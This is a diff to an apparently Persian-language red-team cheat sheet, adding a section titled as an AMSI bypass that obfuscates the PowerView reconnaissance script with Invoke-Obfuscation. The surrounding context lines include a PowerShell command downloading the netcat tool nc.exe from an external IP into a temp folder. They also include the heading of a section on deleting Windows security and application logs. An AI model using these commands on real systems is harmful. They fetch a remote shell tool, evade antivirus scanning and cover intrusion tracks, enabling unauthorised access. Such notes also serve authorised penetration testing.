@@ -723,6 +723,14 @@ Step by step instructions on room362.com for step below
 | \(Net.DNS\]: :GetnostEntry\(" ip "I | فرآیند DNS Lookup |
 | powershell.exe wget "http://10.10.10.10/nc.exe" -outfile "c:\temp\nc.exe" | دریافت و ذخیره سازی فایل |
 
+
+### دورزدن AMSI
+
+```text
+Import-Module .\Invoke-Obfuscation\Invoke-Obfuscation.psm1
+Out-ObfuscatedTokenCommand -Path .\powerview.ps1 | Out-File out
+```
+
 ### حذف گزارشات امنیت و برنامه ها\(برای SVR01\)
 
 ```text
